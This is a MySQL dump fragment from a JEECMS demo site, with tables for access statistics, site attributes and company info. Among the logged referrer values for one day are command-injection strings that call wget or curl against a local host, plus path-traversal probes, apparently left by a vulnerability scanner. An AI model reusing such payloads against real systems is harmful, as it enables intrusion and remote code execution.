/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_access_statistic` (
  `access_statistic_id` int(11) NOT NULL AUTO_INCREMENT,
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `pv` int(11) NOT NULL DEFAULT '0' COMMENT 'pv量',
  `ip` int(11) NOT NULL DEFAULT '0' COMMENT 'ip量',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '访客数量',
  `pages_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均浏览次数',
  `visit_second_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均访问时长（秒）',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `statisitc_type` varchar(255) NOT NULL DEFAULT 'all' COMMENT '统计分类（all代表当天所有访问量的统计）',
  `statistic_column_value` varchar(255) DEFAULT '' COMMENT '统计列值',
  PRIMARY KEY (`access_statistic_id`),
  KEY `fk_jc_access_statistic_site` (`site_id`),
  CONSTRAINT `fk_jc_access_statistic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=363 DEFAULT CHARSET=utf8 COMMENT='访问统计表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_access_statistic`
--

LOCK TABLES `jc_site_access_statistic` WRITE;
/*!40000 ALTER TABLE `jc_site_access_statistic` DISABLE KEYS */;
INSERT INTO `jc_site_access_statistic` VALUES (1,'2016-06-24',3,1,1,3,0,1,'all',''),(2,'2016-06-24',3,1,1,3,0,1,'source','直接访问'),(3,'2016-06-25',187,1,10,18,1291,1,'all',''),(4,'2016-06-25',9,1,2,4,53,1,'source','外部链接'),(5,'2016-06-25',178,1,8,22,1601,1,'source','直接访问'),(6,'2016-06-25',9,1,2,4,53,1,'link','http://localhost:8080'),(7,'2016-06-28',44,1,4,11,251,1,'all',''),(8,'2016-06-28',44,1,4,11,251,1,'source','直接访问'),(9,'2016-06-29',42,1,4,10,1154,1,'all',''),(10,'2016-06-29',42,1,4,10,1154,1,'source','直接访问'),(11,'2016-06-30',8,1,3,2,596,1,'all',''),(12,'2016-06-30',8,1,3,2,596,1,'source','直接访问'),(13,'2016-07-01',3,1,3,1,0,1,'all',''),(14,'2016-07-01',3,1,3,1,0,1,'area','江西省'),(15,'2016-07-01',3,1,3,1,0,1,'source','直接访问'),(16,'2016-07-07',11,1,2,5,93,1,'all',''),(17,'2016-07-07',11,1,2,5,93,1,'area','江西省'),(18,'2016-07-07',11,1,2,5,93,1,'source','直接访问'),(19,'2016-07-08',2,2,2,1,0,1,'all',''),(20,'2016-07-08',2,2,2,1,0,1,'area','江西省'),(21,'2016-07-08',2,2,2,1,0,1,'source','直接访问'),(22,'2016-07-11',5,1,2,2,318,1,'all',''),(23,'2016-07-11',5,1,2,2,318,1,'area','江西省'),(24,'2016-07-11',5,1,2,2,318,1,'source','直接访问'),(25,'2016-07-12',4,1,2,2,97,1,'all',''),(26,'2016-07-12',4,1,2,2,97,1,'area','江西省'),(27,'2016-07-12',4,1,2,2,97,1,'source','直接访问'),(28,'2016-07-14',7,2,5,1,15,1,'all',''),(29,'2016-07-14',2,1,1,2,54,1,'area','北京市'),(30,'2016-07-14',5,1,4,1,6,1,'area','江西省'),(31,'2016-07-14',7,2,5,1,15,1,'source','直接访问'),(32,'2016-07-15',6,3,3,2,1279,1,'all',''),(33,'2016-07-15',1,1,1,1,0,1,'area','内蒙古自治区'),(34,'2016-07-15',4,1,1,4,3837,1,'area','江西省'),(35,'2016-07-15',1,1,1,1,0,1,'area','福建省'),(36,'2016-07-15',6,3,3,2,1279,1,'source','直接访问'),(37,'2016-07-18',94,1,4,23,1466,1,'all',''),(38,'2016-07-18',94,1,4,23,1466,1,'area','江西省'),(39,'2016-07-18',94,1,4,23,1466,1,'source','直接访问'),(40,'2016-07-19',83,7,9,9,1528,1,'all',''),(41,'2016-07-19',4,4,4,1,0,1,'area','上海市'),(42,'2016-07-19',6,1,1,6,1562,1,'area','北京市'),(43,'2016-07-19',70,1,3,23,4040,1,'area','江西省'),(44,'2016-07-19',3,1,1,3,72,1,'area','河南省'),(45,'2016-07-19',83,7,9,9,1528,1,'source','直接访问'),(46,'2016-07-20',4,2,2,2,454,1,'all',''),(47,'2016-07-20',2,1,1,2,6,1,'area','北京市'),(48,'2016-07-20',2,1,1,2,903,1,'area','江西省'),(49,'2016-07-20',4,2,2,2,454,1,'source','直接访问'),(50,'2016-07-25',4,1,2,2,1,1,'all',''),(51,'2016-07-25',4,1,2,2,1,1,'area','江西省'),(52,'2016-07-25',4,1,2,2,1,1,'source','直接访问'),(53,'2016-07-26',1,1,1,1,0,1,'all',''),(54,'2016-07-26',1,1,1,1,0,1,'area','江西省'),(55,'2016-07-26',1,1,1,1,0,1,'source','直接访问'),(56,'2016-07-27',2,1,1,2,14,1,'all',''),(57,'2016-07-27',2,1,1,2,14,1,'area','陕西省'),(58,'2016-07-27',2,1,1,2,14,1,'source','直接访问'),(59,'2016-07-28',154,1,6,25,1396,1,'all',''),(60,'2016-07-28',154,1,6,25,1396,1,'area','江西省'),(61,'2016-07-28',154,1,6,25,1396,1,'source','直接访问'),(62,'2016-07-30',12,2,3,4,353,1,'all',''),(63,'2016-07-30',11,1,2,5,530,1,'area','北京市'),(64,'2016-07-30',1,1,1,1,0,1,'area','河南省'),(65,'2016-07-30',12,2,3,4,353,1,'source','直接访问'),(66,'2016-08-01',2,1,1,2,5,1,'all',''),(67,'2016-08-01',2,1,1,2,5,1,'area','江西省'),(68,'2016-08-01',2,1,1,2,5,1,'source','直接访问'),(69,'2016-08-02',2,1,1,2,445,1,'all',''),(70,'2016-08-02',2,1,1,2,445,1,'area','江西省'),(71,'2016-08-02',2,1,1,2,445,1,'source','直接访问'),(72,'2016-08-03',9,3,3,3,21,1,'all',''),(73,'2016-08-03',2,1,1,2,3,1,'area','北京市'),(74,'2016-08-03',5,1,1,5,58,1,'area','山东省'),(75,'2016-08-03',2,1,1,2,4,1,'area','湖北省'),(76,'2016-08-03',9,3,3,3,21,1,'source','直接访问'),(77,'2016-08-04',2,1,1,2,4,1,'all',''),(78,'2016-08-04',2,1,1,2,4,1,'area','江西省'),(79,'2016-08-04',2,1,1,2,4,1,'source','直接访问'),(80,'2016-08-05',6,1,3,2,221,1,'all',''),(81,'2016-08-05',6,1,3,2,221,1,'area','江西省'),(82,'2016-08-05',6,1,3,2,221,1,'source','直接访问'),(83,'2016-08-06',5,1,2,2,37,1,'all',''),(84,'2016-08-06',5,1,2,2,37,1,'area','江西省'),(85,'2016-08-06',5,1,2,2,37,1,'source','直接访问'),(86,'2016-08-08',7,2,4,1,4,1,'all',''),(87,'2016-08-08',7,2,4,1,4,1,'area','江西省'),(88,'2016-08-08',7,2,4,1,4,1,'source','直接访问'),(89,'2016-08-09',7,1,3,2,56,1,'all',''),(90,'2016-08-09',7,1,3,2,56,1,'area','江西省'),(91,'2016-08-09',7,1,3,2,56,1,'source','直接访问'),(92,'2016-08-10',10,7,8,1,7,1,'all',''),(93,'2016-08-10',3,2,2,1,15,1,'area','广东省'),(94,'2016-08-10',1,1,1,1,0,1,'area','广西壮族自治区'),(95,'2016-08-10',2,2,2,1,0,1,'area','江苏省'),(96,'2016-08-10',4,2,3,1,9,1,'area','江西省'),(97,'2016-08-10',10,7,8,1,7,1,'source','直接访问'),(98,'2016-08-11',3,1,1,3,615,1,'all',''),(99,'2016-08-11',3,1,1,3,615,1,'area','江西省'),(100,'2016-08-11',3,1,1,3,615,1,'source','直接访问'),(101,'2016-08-12',9,5,5,1,31,1,'all',''),(102,'2016-08-12',2,2,2,1,0,1,'area','广东省'),(103,'2016-08-12',1,1,1,1,0,1,'area','江苏省'),(104,'2016-08-12',5,1,1,5,155,1,'area','河南省'),(105,'2016-08-12',1,1,1,1,0,1,'area','湖北省'),(106,'2016-08-12',9,5,5,1,31,1,'source','直接访问'),(107,'2016-08-15',8,4,5,1,4,1,'all',''),(108,'2016-08-15',1,1,1,1,0,1,'area','上海市'),(109,'2016-08-15',4,1,2,2,9,1,'area','江西省'),(110,'2016-08-15',1,1,1,1,0,1,'area','河南省'),(111,'2016-08-15',2,1,1,2,3,1,'area','湖北省'),(112,'2016-08-15',8,4,5,1,4,1,'source','直接访问'),(113,'2016-08-16',6,3,4,1,304,1,'all',''),(114,'2016-08-16',2,2,2,1,0,1,'area','广东省'),(115,'2016-08-16',4,1,2,2,608,1,'area','江西省'),(116,'2016-08-16',6,3,4,1,304,1,'source','直接访问'),(117,'2016-08-17',1,1,1,1,0,1,'all',''),(118,'2016-08-17',1,1,1,1,0,1,'area','江西省'),(119,'2016-08-17',1,1,1,1,0,1,'source','直接访问'),(120,'2016-08-18',5,1,2,2,406,1,'all',''),(121,'2016-08-18',5,1,2,2,406,1,'area','陕西省'),(122,'2016-08-18',5,1,2,2,406,1,'source','直接访问'),(123,'2016-08-19',2,2,2,1,0,1,'all',''),(124,'2016-08-19',1,1,1,1,0,1,'area','上海市'),(125,'2016-08-19',1,1,1,1,0,1,'area','河南省'),(126,'2016-08-19',2,2,2,1,0,1,'source','直接访问'),(127,'2016-08-20',11,2,4,2,120,1,'all',''),(128,'2016-08-20',10,1,3,3,160,1,'area','江西省'),(129,'2016-08-20',1,1,1,1,0,1,'area','湖北省'),(130,'2016-08-20',11,2,4,2,120,1,'source','直接访问'),(131,'2016-08-21',2,1,1,2,17,1,'all',''),(132,'2016-08-21',2,1,1,2,17,1,'area','江西省'),(133,'2016-08-21',2,1,1,2,17,1,'source','直接访问'),(134,'2016-08-22',25,4,6,4,1403,1,'all',''),(135,'2016-08-22',3,2,2,1,2,1,'area','北京市'),(136,'2016-08-22',1,1,1,1,0,1,'area','江苏省'),(137,'2016-08-22',21,1,3,7,2806,1,'area','江西省'),(138,'2016-08-22',25,4,6,4,1403,1,'source','直接访问'),(139,'2016-08-23',9,2,4,2,331,1,'all',''),(140,'2016-08-23',4,1,1,4,1153,1,'area','江苏省'),(141,'2016-08-23',5,1,3,1,57,1,'area','江西省'),(142,'2016-08-23',9,2,4,2,331,1,'source','直接访问'),(143,'2016-08-24',4,2,2,2,43,1,'all',''),(144,'2016-08-24',3,1,1,3,86,1,'area','安徽省'),(145,'2016-08-24',1,1,1,1,0,1,'area','江西省'),(146,'2016-08-24',4,2,2,2,43,1,'source','直接访问'),(147,'2016-08-25',12,2,4,3,21,1,'all',''),(148,'2016-08-25',12,2,4,3,21,1,'area','江西省'),(149,'2016-08-25',12,2,4,3,21,1,'source','直接访问'),(150,'2016-08-26',3,2,3,1,0,1,'all',''),(151,'2016-08-26',3,2,3,1,0,1,'area','江西省'),(152,'2016-08-26',3,2,3,1,0,1,'source','直接访问'),(153,'2016-08-29',3,2,3,1,0,1,'all',''),(154,'2016-08-29',1,1,1,1,0,1,'area','北京市'),(155,'2016-08-29',1,1,1,1,0,1,'area','江西省'),(156,'2016-08-29',3,2,3,1,0,1,'source','直接访问'),(157,'2016-08-30',49,15,17,2,121,1,'all',''),(158,'2016-08-30',4,4,4,1,0,1,'area','上海市'),(159,'2016-08-30',21,3,4,5,237,1,'area','北京市'),(160,'2016-08-30',3,1,1,3,107,1,'area','山东省'),(161,'2016-08-30',9,1,1,9,863,1,'area','广东省'),(162,'2016-08-30',5,1,1,5,141,1,'area','江西省'),(163,'2016-08-30',1,1,1,1,0,1,'area','河北省'),(164,'2016-08-30',1,1,1,1,0,1,'area','浙江省'),(165,'2016-08-30',2,1,2,1,0,1,'area','贵州省'),(166,'2016-08-30',3,2,2,1,2,1,'area','辽宁省'),(167,'2016-08-30',49,15,17,2,121,1,'source','直接访问'),(168,'2016-08-31',3,1,2,1,2,1,'all',''),(169,'2016-08-31',3,1,2,1,2,1,'area','江西省'),(170,'2016-08-31',3,1,2,1,2,1,'source','直接访问'),(171,'2016-09-01',12,4,6,2,95,1,'all',''),(172,'2016-09-01',1,1,1,1,0,1,'area','北京市'),(173,'2016-09-01',2,1,1,2,15,1,'area','广东省'),(174,'2016-09-01',4,1,2,2,100,1,'area','江西省'),(175,'2016-09-01',5,1,2,2,177,1,'area','贵州省'),(176,'2016-09-01',12,4,6,2,95,1,'source','直接访问'),(177,'2016-09-02',10,1,1,10,435,1,'all',''),(178,'2016-09-02',10,1,1,10,435,1,'area','江西省'),(179,'2016-09-02',10,1,1,10,435,1,'source','直接访问'),(180,'2016-09-03',6,1,2,3,125,1,'all',''),(181,'2016-09-03',6,1,2,3,125,1,'area','江西省'),(182,'2016-09-03',6,1,2,3,125,1,'source','直接访问'),(183,'2016-09-04',8,3,3,2,50,1,'all',''),(184,'2016-09-04',4,1,1,4,101,1,'area','广东省'),(185,'2016-09-04',4,2,2,2,25,1,'area','江苏省'),(186,'2016-09-04',8,3,3,2,50,1,'source','直接访问'),(187,'2016-09-05',14,4,4,3,130,1,'all',''),(188,'2016-09-05',1,1,1,1,0,1,'area','北京市'),(189,'2016-09-05',4,1,1,4,248,1,'area','广东省'),(190,'2016-09-05',6,1,1,6,274,1,'area','江西省'),(191,'2016-09-05',3,1,1,3,0,1,'area','贵州省'),(192,'2016-09-05',14,4,4,3,130,1,'source','直接访问'),(193,'2016-09-06',32,2,11,2,1394,1,'all',''),(194,'2016-09-06',32,2,11,2,1394,1,'area','江西省'),(195,'2016-09-06',32,2,11,2,1394,1,'source','直接访问'),(196,'2016-09-07',12,5,5,2,607,1,'all',''),(197,'2016-09-07',1,1,1,1,0,1,'area','北京市'),(198,'2016-09-07',3,1,1,3,16,1,'area','广东省'),(199,'2016-09-07',5,2,2,2,1267,1,'area','江西省'),(200,'2016-09-07',3,1,1,3,486,1,'area','陕西省'),(201,'2016-09-07',12,5,5,2,607,1,'source','直接访问'),(202,'2016-09-08',7,2,2,3,48,1,'all',''),(203,'2016-09-08',7,2,2,3,48,1,'area','江苏省'),(204,'2016-09-08',7,2,2,3,48,1,'source','直接访问'),(205,'2016-09-09',5,1,3,1,29,1,'all',''),(206,'2016-09-09',5,1,3,1,29,1,'area','江西省'),(207,'2016-09-09',5,1,3,1,29,1,'source','直接访问'),(208,'2016-09-12',13,6,6,2,24,1,'all',''),(209,'2016-09-12',1,1,1,1,0,1,'area','上海市'),(210,'2016-09-12',4,1,1,4,63,1,'area','北京市'),(211,'2016-09-12',5,1,1,5,81,1,'area','江苏省'),(212,'2016-09-12',2,2,2,1,0,1,'area','江西省'),(213,'2016-09-12',1,1,1,1,0,1,'area','黑龙江省'),(214,'2016-09-12',13,6,6,2,24,1,'source','直接访问'),(215,'2016-09-13',79,3,19,4,782,1,'all',''),(216,'2016-09-13',8,1,1,8,935,1,'area','广东省'),(217,'2016-09-13',55,1,17,3,770,1,'area','江西省'),(218,'2016-09-13',16,1,1,16,838,1,'area','贵州省'),(219,'2016-09-13',79,3,19,4,782,1,'source','直接访问'),(220,'2016-09-14',17,2,5,3,1595,1,'all',''),(221,'2016-09-14',15,1,4,3,1835,1,'area','江西省'),(222,'2016-09-14',2,1,1,2,635,1,'area','贵州省'),(223,'2016-09-14',17,2,5,3,1595,1,'source','直接访问'),(224,'2016-09-19',4,2,2,2,10,1,'all',''),(225,'2016-09-19',2,1,1,2,3,1,'area','山西省'),(226,'2016-09-19',2,1,1,2,18,1,'area','江西省'),(227,'2016-09-19',4,2,2,2,10,1,'source','直接访问'),(228,'2016-09-20',1,1,1,1,0,1,'all',''),(229,'2016-09-20',1,1,1,1,0,1,'area','江西省'),(230,'2016-09-20',1,1,1,1,0,1,'source','直接访问'),(231,'2016-09-21',2,1,1,2,19,1,'all',''),(232,'2016-09-21',2,1,1,2,19,1,'area','江苏省'),(233,'2016-09-21',2,1,1,2,19,1,'source','直接访问'),(234,'2016-09-22',24,4,5,4,2180,1,'all',''),(235,'2016-09-22',22,2,3,7,3633,1,'area','江西省'),(236,'2016-09-22',2,2,2,1,0,1,'area','河南省'),(237,'2016-09-22',24,4,5,4,2180,1,'source','直接访问'),(238,'2016-09-23',83,12,17,4,1586,1,'all',''),(239,'2016-09-23',3,2,2,1,0,1,'area','北京市'),(240,'2016-09-23',2,1,1,2,0,1,'area','四川省'),(241,'2016-09-23',8,3,3,2,62,1,'area','广东省'),(242,'2016-09-23',63,3,8,7,3332,1,'area','江西省'),(243,'2016-09-23',2,1,1,2,5,1,'area','河南省'),(244,'2016-09-23',4,1,1,4,118,1,'area','海南省'),(245,'2016-09-23',1,1,1,1,0,1,'area','辽宁省'),(246,'2016-09-23',83,12,17,4,1586,1,'source','直接访问'),(247,'2016-09-24',2,1,1,2,18,1,'all',''),(248,'2016-09-24',2,1,1,2,18,1,'area','江西省'),(249,'2016-09-24',2,1,1,2,18,1,'source','直接访问'),(250,'2016-09-26',281,10,15,18,3117,1,'all',''),(251,'2016-09-26',5,4,5,1,0,1,'area','上海市'),(252,'2016-09-26',3,2,2,1,5,1,'area','北京市'),(253,'2016-09-26',8,1,2,4,99,1,'area','吉林省'),(254,'2016-09-26',2,1,1,2,54,1,'area','广东省'),(255,'2016-09-26',263,2,5,52,9299,1,'area','江西省'),(256,'2016-09-26',281,10,15,18,3117,1,'source','直接访问'),(257,'2016-09-27',114,4,7,16,3455,1,'all',''),(258,'2016-09-27',1,1,1,1,0,1,'area','上海市'),(259,'2016-09-27',1,1,1,1,0,1,'area','北京市'),(260,'2016-09-27',1,1,1,1,0,1,'area','吉林省'),(261,'2016-09-27',111,1,4,27,6047,1,'area','江西省'),(262,'2016-09-27',2,2,2,1,0,1,'source','搜索引擎'),(263,'2016-09-27',112,2,5,22,4837,1,'source','直接访问'),(264,'2016-09-27',2,2,2,1,0,1,'engine','百度'),(265,'2016-09-28',336,26,46,7,1119,1,'all',''),(266,'2016-09-28',2,1,1,2,21,1,'area','上海市'),(267,'2016-09-28',25,4,5,5,104,1,'area','北京市'),(268,'2016-09-28',3,1,1,3,5272,1,'area','吉林省'),(269,'2016-09-28',2,2,2,1,0,1,'area','四川省'),(270,'2016-09-28',7,1,1,7,88,1,'area','天津市'),(271,'2016-09-28',1,1,1,1,0,1,'area','安徽省'),(272,'2016-09-28',2,1,1,2,1,1,'area','山东省'),(273,'2016-09-28',2,2,2,1,0,1,'area','山西省'),(274,'2016-09-28',8,3,3,2,414,1,'area','广东省'),(275,'2016-09-28',1,1,1,1,0,1,'area','江苏省'),(276,'2016-09-28',233,1,19,12,2286,1,'area','江西省'),(277,'2016-09-28',9,1,1,9,156,1,'area','河南省'),(278,'2016-09-28',8,1,1,8,60,1,'area','海南省'),(279,'2016-09-28',12,3,3,4,45,1,'area','湖北省'),(280,'2016-09-28',10,2,2,5,191,1,'area','湖南省'),(281,'2016-09-28',10,1,1,10,154,1,'area','重庆市'),(282,'2016-09-28',336,26,46,7,1119,1,'source','直接访问'),(283,'2016-09-29',217,12,36,6,1090,1,'all',''),(284,'2016-09-29',5,4,4,1,0,1,'area','上海市'),(285,'2016-09-29',5,1,1,5,217,1,'area','山东省'),(286,'2016-09-29',23,5,13,1,152,1,'area','广东省'),(287,'2016-09-29',179,1,15,11,2467,1,'area','江西省'),(288,'2016-09-29',5,1,3,1,10,1,'area','福建省'),(289,'2016-09-29',5,1,1,5,217,1,'source','外部链接'),(290,'2016-09-29',3,3,3,1,0,1,'source','搜索引擎'),(291,'2016-09-29',209,8,32,6,1219,1,'source','直接访问'),(292,'2016-09-29',3,3,3,1,0,1,'engine','百度'),(293,'2016-09-29',5,1,1,5,217,1,'link','http://bbs.jeecms.com'),(294,'2016-09-30',229,5,11,20,1721,1,'all',''),(295,'2016-09-30',1,1,1,1,0,1,'area','上海市'),(296,'2016-09-30',3,2,2,1,8,1,'area','广东省'),(297,'2016-09-30',221,1,6,36,3127,1,'area','江西省'),(298,'2016-09-30',4,1,2,2,76,1,'area','福建省'),(299,'2016-09-30',229,5,11,20,1721,1,'source','直接访问'),(300,'2016-10-01',5,1,1,5,89,1,'all',''),(301,'2016-10-01',5,1,1,5,89,1,'area','山东省'),(302,'2016-10-01',5,1,1,5,89,1,'source','直接访问'),(303,'2016-10-02',13,1,1,13,459,1,'all',''),(304,'2016-10-02',13,1,1,13,459,1,'area','山东省'),(305,'2016-10-02',13,1,1,13,459,1,'source','搜索引擎'),(306,'2016-10-02',13,1,1,13,459,1,'engine','百度'),(307,'2016-10-03',1,1,1,1,0,1,'all',''),(308,'2016-10-03',1,1,1,1,0,1,'area','北京市'),(309,'2016-10-03',1,1,1,1,0,1,'source','搜索引擎'),(310,'2016-10-03',1,1,1,1,0,1,'engine','百度'),(311,'2016-10-03',1,1,1,1,0,1,'keyword','首页-jeecms演示站-PoweredbyJEECMS'),(312,'2016-10-05',1,1,1,1,0,1,'all',''),(313,'2016-10-05',1,1,1,1,0,1,'area','北京市'),(314,'2016-10-05',1,1,1,1,0,1,'source','搜索引擎'),(315,'2016-10-05',1,1,1,1,0,1,'engine','百度'),(316,'2016-10-05',1,1,1,1,0,1,'keyword','不实名手机号停机在即移动:不对任何社会渠道授权网络售卡-jeecms演示站-PoweredbyJEECMS'),(317,'2016-10-06',10,1,1,10,142,1,'all',''),(318,'2016-10-06',10,1,1,10,142,1,'area','江苏省'),(319,'2016-10-06',10,1,1,10,142,1,'source','直接访问'),(320,'2016-10-08',448,4,32,14,1556,1,'all',''),(321,'2016-10-08',27,2,4,6,141,1,'area','广东省'),(322,'2016-10-08',411,1,26,15,1889,1,'area','江西省'),(323,'2016-10-08',6,1,1,6,36,1,'area','黑龙江省'),(324,'2016-10-08',448,4,32,14,1556,1,'source','直接访问'),(325,'2016-10-09',290,6,17,17,1572,1,'all',''),(326,'2016-10-09',46,2,2,23,290,1,'area','北京市'),(327,'2016-10-09',241,2,13,18,1991,1,'area','江西省'),(328,'2016-10-09',2,1,1,2,264,1,'area','黑龙江省'),(329,'2016-10-09',1,1,1,1,0,1,'source','搜索引擎'),(330,'2016-10-09',289,5,16,18,1671,1,'source','直接访问'),(331,'2016-10-09',1,1,1,1,0,1,'engine','百度'),(332,'2016-10-10',2821,4,2314,1,33,1,'all',''),(333,'2016-10-10',3,1,1,3,94,1,'area','上海市'),(334,'2016-10-10',25,1,4,6,270,1,'area','北京市'),(335,'2016-10-10',18,1,1,18,185,1,'area','江苏省'),(336,'2016-10-10',1022,1,555,1,137,1,'area','江西省'),(337,'2016-10-10',123,1,123,1,0,1,'source','外部链接'),(338,'2016-10-10',2698,4,2191,1,35,1,'source','直接访问'),(339,'2016-10-10',1,1,1,1,0,1,'link','\"|wget http://192.168.0.2:51167'),(340,'2016-10-10',1,1,1,1,0,1,'link','\'|wget http://192.168.0.2:51167'),(341,'2016-10-10',7,1,7,1,0,1,'link','../../..'),(342,'2016-10-10',5,1,5,1,0,1,'link','/%2e%2e/%2e%2e/%2e%2e'),(343,'2016-10-10',77,1,77,1,0,1,'link','/../../..'),(344,'2016-10-10',2,1,2,1,0,1,'link','//..../'),(345,'2016-10-10',20,1,20,1,0,1,'link','/À®À®/À®À®/À®À®'),(346,'2016-10-10',1,1,1,1,0,1,'link',';curl http://192.168.0.2:51167'),(347,'2016-10-10',3,1,3,1,0,1,'link','file://C:'),(348,'2016-10-10',5,1,5,1,0,1,'link','hTTp://192.168.0.2:51167'),(349,'2016-10-10',1,1,1,1,0,1,'link','|wget http://192.168.0.2:51167'),(350,'2016-10-11',82,6,14,5,823,1,'all',''),(351,'2016-10-11',13,2,2,6,92,1,'area','北京市'),(352,'2016-10-11',15,2,2,7,1651,1,'area','广东省'),(353,'2016-10-11',41,1,6,6,1315,1,'area','江西省'),(354,'2016-10-11',82,6,14,5,823,1,'source','直接访问'),(355,'2016-10-12',21,1,3,7,339,1,'all',''),(356,'2016-10-12',21,1,3,7,339,1,'source','直接访问'),(357,'2016-10-13',5,1,3,1,135,1,'all',''),(358,'2016-10-13',5,1,3,1,135,1,'source','直接访问'),(359,'2016-10-14',11,1,2,5,133,1,'all',''),(360,'2016-10-14',11,1,2,5,133,1,'source','直接访问'),(361,'2016-12-20',1,1,1,1,0,1,'all',''),(362,'2016-12-20',1,1,1,1,0,1,'source','直接访问');
/*!40000 ALTER TABLE `jc_site_access_statistic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_attr`
--

DROP TABLE IF EXISTS `jc_site_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_attr` (
  `site_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_site` (`site_id`),
  CONSTRAINT `fk_jc_attr_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_attr`
--

LOCK TABLES `jc_site_attr` WRITE;
/*!40000 ALTER TABLE `jc_site_attr` DISABLE KEYS */;
INSERT INTO `jc_site_attr` VALUES (1,'pvTotal','7182'),(1,'visitors','4971'),(1,'wxAppkey','111111'),(1,'wxAppSecret','111111'),(1,'dayPvTotal','0'),(1,'dayVisitors','0'),(1,'weekPvTotal','0'),(1,'monthPvTotal','0'),(1,'monthVisitors','0'),(1,'weekVisitors','0');
/*!40000 ALTER TABLE `jc_site_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_cfg`
--

DROP TABLE IF EXISTS `jc_site_cfg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_cfg` (
  `site_id` int(11) NOT NULL,
  `cfg_name` varchar(30) NOT NULL COMMENT '名称',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_cfg_site` (`site_id`),
  CONSTRAINT `fk_jc_cfg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点配置表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_cfg`
--

LOCK TABLES `jc_site_cfg` WRITE;
/*!40000 ALTER TABLE `jc_site_cfg` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_site_cfg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_company`
--

DROP TABLE IF EXISTS `jc_site_company`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_company` (
  `site_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL COMMENT '公司名称',
  `scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `nature` varchar(255) DEFAULT NULL COMMENT '公司性质',
  `industry` varchar(1000) DEFAULT NULL COMMENT '公司行业',
  `contact` varchar(500) DEFAULT NULL COMMENT '联系方式',
  `description` text COMMENT '公司简介',
  `address` varchar(500) DEFAULT NULL COMMENT '公司地址',
  `longitude` float(5,2) DEFAULT NULL COMMENT '经度',
  `latitude` float(4,2) DEFAULT NULL COMMENT '纬度',
  PRIMARY KEY (`site_id`),
  CONSTRAINT `fk_jc_company_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='公司信息';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_company`
--

LOCK TABLES `jc_site_company` WRITE;
/*!40000 ALTER TABLE `jc_site_company` DISABLE KEYS */;
INSERT INTO `jc_site_company` VALUES (1,'JEECMS开发站','10-20人','私企','互联网','','<p><span id=\"_baidu_bookmark_start_1\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_4\" style=\"display: none; line-height: 0px;\">‍</span></p><p><span id=\"_baidu_bookmark_start_0\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_3\" style=\"display: none; line-height: 0px;\">‍</span><br/></p><p><span id=\"_baidu_bookmark_end_5\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_end_2\" style=\"display: none; line-height: 0px;\">‍</span></p>','',NULL,NULL);
/*!40000 ALTER TABLE `jc_site_company` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_model`
--

DROP TABLE IF EXISTS `jc_site_model`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_model` (
  `model_id` int(11) NOT NULL AUTO_INCREMENT,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `model_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `upload_path` varchar(100) DEFAULT NULL COMMENT '上传路径',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) DEFAULT '1' COMMENT '0:编辑器;1:文本框;2:文本区;3:图片;4:附件',
  `is_single` tinyint(1) DEFAULT '1' COMMENT '是否独占一行',
  PRIMARY KEY (`model_id`),
  UNIQUE KEY `ak_field` (`field`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点信息模型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_model`
--

LOCK TABLES `jc_site_model` WRITE;
/*!40000 ALTER TABLE `jc_site_model` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_site_model` ENABLE KEYS */;
